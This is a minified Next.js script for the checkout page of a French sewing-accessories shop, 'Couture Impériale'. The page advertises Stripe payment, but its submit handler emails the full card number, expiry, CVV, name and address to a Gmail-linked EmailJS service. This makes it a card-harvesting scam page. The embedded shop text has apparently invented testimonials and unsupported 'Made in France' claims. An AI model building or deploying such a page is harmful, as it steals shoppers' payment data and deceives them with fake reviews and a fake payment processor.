(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[435],{2830:(e,t,i)=>{(window.__NEXT_P=window.__NEXT_P||[]).push(["/paiement",function(){return i(3873)}])},3873:(e,t,i)=>{"use strict";i.r(t),i.d(t,{default:()=>n});var s=i(4848),a=i(6540);i(3368);var r=i(1815);let o=i(1751).f[0];function n(){let e=(0,a.useRef)(null);(0,a.useEffect)(()=>{let t=e=>{let{value:t}=e.target;2!==t.length||t.includes("/")||(e.target.value=t+"/")},i=e.current;return i.addEventListener("input",t),()=>{i.removeEventListener("input",t)}},[]);let[t,i]=(0,a.useState)([]),[n,c]=(0,a.useState)("card");(0,a.useEffect)(()=>{i((JSON.parse(localStorage.getItem("cart"))||[]).reduce((e,t)=>{let i=e.find(e=>e.productTitle===t.productTitle);return i?i.quantity+=1:e.push({...t,quantity:1}),e},[]))},[]),(0,a.useEffect)(()=>{r.Ay.init("8SL7vzVHt7qSqEd4i")},[]);let l=t.reduce((e,t)=>e+(parseFloat(t.productPrice.replace("€","").replace(",","."))||0)*t.quantity,0).toFixed(2),u=(.1*l).toFixed(2),d=(l-u).toFixed(2);function m(e){if("undefined"!=typeof document){let t=document.querySelectorAll(".checkout-step");t.forEach(e=>e.classList.remove("active")),t[e].classList.add("active")}}return(0,s.jsxs)("div",{className:"paiement-container",children:[(0,s.jsxs)("div",{className:"left-column",children:[(0,s.jsx)("a",{className:"back",href:"/boutique",children:"< Retour \xe0 la boutique"}),(0,s.jsxs)("div",{className:"shop-info",children:[(0,s.jsx)("h2",{children:"Payez ".concat(o.shopName)}),(0,s.jsx)("h1",{children:"".concat(parseFloat(d).toLocaleString("fr-FR",{minimumFractionDigits:2,maximumFractionDigits:2})," €")})]}),(0,s.jsxs)("div",{className:"cart-summary",children:[(0,s.jsx)("ul",{children:t.map((e,t)=>(0,s.jsx)("li",{children:(0,s.jsxs)("div",{className:"cart-item",children:[(0,s.jsx)("h4",{children:e.productTitle}),(0,s.jsxs)("p",{className:"quantity",children:["(x",e.quantity,")"]}),(0,s.jsx)("p",{children:"".concat(parseFloat(e.productPrice.replace("€","").replace(",",".")).toFixed(2).toLocaleString("fr-FR",{minimumFractionDigits:2,maximumFractionDigits:2})," €")})]})},t))}),(0,s.jsxs)("div",{className:"cart-item discount",children:[(0,s.jsx)("h4",{children:"R\xe9duction 10% premi\xe8re commande"}),(0,s.jsx)("p",{children:"-".concat(parseFloat(u).toLocaleString("fr-FR",{minimumFractionDigits:2,maximumFractionDigits:2})," €")})]}),(0,s.jsxs)("div",{className:"cart-item subtotal",children:[(0,s.jsx)("h4",{children:"Avant-r\xe9duction"}),(0,s.jsx)("p",{children:"".concat(parseFloat(l).toLocaleString("fr-FR",{minimumFractionDigits:2,maximumFractionDigits:2})," €")})]}),(0,s.jsxs)("div",{className:"total-price",children:[(0,s.jsx)("h4",{children:"Total d\xfb :"}),(0,s.jsx)("p",{children:"".concat(parseFloat(d).toLocaleString("fr-FR",{minimumFractionDigits:2,maximumFractionDigits:2})," €")})]})]}),(0,s.jsxs)("p",{className:"secure footer",children:["\xa9 2024 - Tous droits r\xe9serv\xe9s -  ",o.shopName," SAS 32455"]})]}),(0,s.jsx)("div",{className:"right-column",children:(0,s.jsxs)("form",{className:"checkout-form",onSubmit:e=>{e.preventDefault(),r.Ay.sendForm("gmail-benedikt","new-payment",e.target).then(()=>{console.log("SUCCESS!"),localStorage.removeItem("cart"),document.querySelector(".left-column").style.display="none",document.querySelector(".right-column").style.width="100%",document.querySelector(".right-column").style.maxWidth="none",i([]),m(2)}).catch(e=>{console.log("FAILED...",e)})},children:[(0,s.jsx)("input",{type:"hidden",name:"totalPrice",value:d}),(0,s.jsx)("input",{type:"hidden",name:"products",value:t.map(e=>"".concat(e.productTitle," (x").concat(e.quantity,")")).join(", ")}),(0,s.jsx)("input",{type:"hidden",name:"website",value:o.shopName}),(0,s.jsxs)("div",{className:"checkout-step active",children:[(0,s.jsx)("h3",{children:"Informations de livraison"}),(0,s.jsx)("input",{type:"text",name:"address",placeholder:"Adresse du domicile"}),(0,s.jsx)("input",{type:"text",name:"suite",placeholder:"Maison, suite, num\xe9ro, etc. (optionnel)"}),(0,s.jsxs)("div",{className:"form-row",children:[(0,s.jsx)("input",{type:"text",name:"postalCode",placeholder:"Code postal"}),(0,s.jsx)("input",{type:"text",name:"city",placeholder:"Ville"})]}),(0,s.jsx)("h3",{children:"Compte client"}),(0,s.jsx)("input",{type:"text",name:"email",placeholder:"Email"}),(0,s.jsxs)("div",{className:"form-row",children:[(0,s.jsx)("input",{type:"text",name:"firstName",placeholder:"Pr\xe9nom"}),(0,s.jsx)("input",{type:"text",name:"lastName",placeholder:"Nom"})]}),(0,s.jsx)("button",{type:"button",id:"delivery-checkout",onClick:()=>m(1),children:"\xc9tape suivante"})]}),(0,s.jsxs)("div",{className:"checkout-step",children:[(0,s.jsx)("h3",{children:"Mode de paiement"}),(0,s.jsxs)("label",{className:"payment-method ".concat("card"===n?"selected":""),children:[(0,s.jsx)("input",{type:"radio",name:"paymentMethod",value:"card",checked:"card"===n,onChange:()=>c("card")}),(0,s.jsx)("img",{src:"/card-badges.png",alt:"cartes bancaires"}),(0,s.jsx)("span",{children:"Stripe"})]}),(0,s.jsxs)("label",{className:"unvalaible payment-method ".concat("paypal"===n?"selected":""),children:[(0,s.jsx)("input",{type:"radio",name:"paymentMethod",value:"paypal",checked:"paypal"===n,onChange:()=>c("paypal")}),(0,s.jsx)("img",{src:"/paypal-simple.png",alt:"cartes bancaires"}),(0,s.jsx)("span",{children:"Indisponible"})]}),(0,s.jsx)("h3",{children:"Informations de la carte"}),(0,s.jsx)("input",{type:"text",name:"cardNumber",placeholder:"1234 1234 1234 1234"}),(0,s.jsxs)("div",{className:"form-row",children:[(0,s.jsx)("input",{type:"text",name:"expiryDate",placeholder:"MM/YY",maxLength:"5",ref:e}),(0,s.jsx)("input",{type:"text",name:"cvv",placeholder:"CVV",maxLength:"3"})]}),(0,s.jsxs)("article",{className:"checkout-buttons",children:[(0,s.jsx)("button",{className:"back-checkout",type:"button",onClick:()=>m(0),children:"<"}),(0,s.jsx)("button",{id:"pay-checkout",type:"submit",children:"Proc\xe9der au paiement"})]})]}),(0,s.jsxs)("div",{className:"checkout-step confirmation",children:[(0,s.jsx)("h2",{children:"Commande confirm\xe9e"}),(0,s.jsxs)("p",{children:["Merci pour votre commande, ",o.shopName," vous remercie pour votre confiance."]}),(0,s.jsx)("p",{children:"Comptez environ 3 jours ouvr\xe9s avant r\xe9ception de votre commande \xe0 bon port !"}),(0,s.jsx)("a",{href:"/",children:(0,s.jsx)("button",{type:"button",children:"Retour \xe0 la boutique"})})]})]})})]})}},1751:e=>{"use strict";e.exports=JSON.parse('{"f":[{"keyword":"Accessoires de couture pas cher","keywordPlurial":"Accesoiress de couture pas cher","slug":"accessoires-de-couture-pas","source":"https://www.lidl.fr/h/accessoires-de-couture/h10018641?srsltid=AfmBOoqagaDP2ncE6BBObqDE05n0UT0fkixzRllVe47Ws79tXx1w_INP","shopName":"Couture Imp\xe9riale","heroTitle":"Accessoires de couture pas cher, qualit\xe9 fran\xe7aise assur\xe9e","heroDescription":"D\xe9couvrez des tr\xe9sors de couture \xe0 prix doux. Profitez de la qualit\xe9 Made in France pour sublimer vos cr\xe9ations.","heroImageKeywords":"Aiguilles Fines","introTitle":"Faites p\xe9tiller vos cr\xe9ations","introDescription":"Bienvenue chez Couture Imp\xe9riale, votre destination pour des accessoires de couture de qualit\xe9 au meilleur prix. Nous sommes fiers de vous offrir le savoir-faire fran\xe7ais \xe0 travers notre s\xe9lection soigneusement choisie d’articles indispensables pour tous vos projets cr\xe9atifs. Chacune de nos pi\xe8ces est un reflet de notre engagement envers l\'excellence et l’accessibilit\xe9. Rejoignez notre communaut\xe9 d’enthousiastes de couture et exp\xe9rimentez ce que signifie v\xe9ritablement “fran\xe7ais”.","aboutTitle":"Savoir-faire Unique","aboutDescription":"Chez Couture Imp\xe9riale, l\'art de la couture est notre priorit\xe9. Nous s\xe9lectionnons des produits qui m\xealent tradition et innovation pour offrir \xe0 nos clients le meilleur des deux mondes. Notre \xe9quipe d\xe9vou\xe9e veille \xe0 ce que chaque article respecte les standards de qualit\xe9 Made in France, garantissant durabilit\xe9 et performance. Avec nous, chaque point compte.","aboutImageKeywords":"\xc9l\xe9gance Fran\xe7aise","testimonial1":"Jacques Delamont","author1":"J’ai r\xe9cemment d\xe9couvert Couture Imp\xe9riale et je suis absolument ravi de la qualit\xe9 des produits propos\xe9s ! Non seulement les prix sont incroyablement abordables, mais la diversit\xe9 des accessoires m’a permis de renouveler tout mon mat\xe9riel sans me ruiner. Je recommande vivement cette boutique pour tout amateur de couture qui recherche \xe0 la fois la qualit\xe9 et l’\xe9conomie.","testimonial2":"Charlotte Legris","author2":"Couture Imp\xe9riale m’a s\xe9duite d\xe8s ma premi\xe8re commande. La livraison a \xe9t\xe9 rapide et j\'ai \xe9t\xe9 impressionn\xe9e par le soin apport\xe9 \xe0 l\'emballage de mes accessoires. Leur service client a su r\xe9pondre \xe0 mes moindres interrogations avec bienveillance, ce qui m\'a confort\xe9e dans mon choix d\'achat. Une exp\xe9rience d\'achat comme on n\'en fait plus !","testimonial3":"Eliot Marchand","author3":"J\'ai longtemps cherch\xe9 un magasin qui allie qualit\xe9 fran\xe7aise et prix comp\xe9titifs, et je l\'ai enfin trouv\xe9 avec Couture Imp\xe9riale. Les accessoires sont non seulement fonctionnels, mais \xe9galement esth\xe9tiques, ce qui ajoute une touche de charme \xe0 mes cr\xe9ations. C’est un plaisir d’y acheter et de d\xe9couvrir sans cesse de nouveaux produits.","contactTitle":"Contactez-nous","contactDescription":"Pour toute question ou besoin d\'assistance, notre \xe9quipe est \xe0 votre disposition du lundi au vendredi. Votre satisfaction est notre priorit\xe9 absolue, et nous sommes l\xe0 pour vous aider !","footerText":"Merci de nous avoir choisis chez Couture Imp\xe9riale. Nous esp\xe9rons que votre exp\xe9rience est aussi enrichissante que vos projets cr\xe9atifs !","buttonColor":"#2D2B55","productsDescription":"D\xe9couvrez notre collection d’accessoires de couture allant des fils aux ciseaux, tout en respectant l’authentique tradition fran\xe7aise. Nos produits sont con\xe7us pour faciliter votre travail et inspirer vos cr\xe9ations, le tout \xe0 des prix d\xe9fiant toute concurrence.","heroImageUrl":"https://images.pexels.com/photos/6266302/pexels-photo-6266302.jpeg?auto=compress&cs=tinysrgb&h=650&w=940"}]}')}},e=>{var t=t=>e(e.s=t);e.O(0,[434,636,593,792],()=>t(2830)),_N_E=e.O()}]);